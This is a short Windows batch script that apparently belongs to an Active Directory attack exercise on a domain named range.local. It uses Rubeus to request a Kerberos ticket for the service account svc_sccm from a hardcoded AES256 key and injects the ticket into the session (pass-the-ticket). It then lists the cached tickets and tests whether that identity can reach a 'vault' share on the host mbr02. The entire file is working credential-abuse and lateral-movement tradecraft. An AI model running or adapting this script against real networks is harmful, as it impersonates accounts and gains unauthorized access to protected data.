@echo off
chcp 437 >nul
cd /d C:\Tools\ADTools
Rubeus.exe asktgt /user:svc_sccm /domain:range.local /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /ptt >nul 2>&1
echo === KLIST ===
klist
echo === NET VIEW \\mbr02.range.local ===
net view \\mbr02.range.local
echo NETVIEW_EXITCODE=%errorlevel%
echo === TEST SMB SHARE LIST AS svc_sccm ===
net use \\mbr02.range.local\vault >nul 2>&1 && echo VAULT_ACCESS_OK || echo VAULT_ACCESS_DENIED
net use \\mbr02.range.local\vault /delete >nul 2>&1
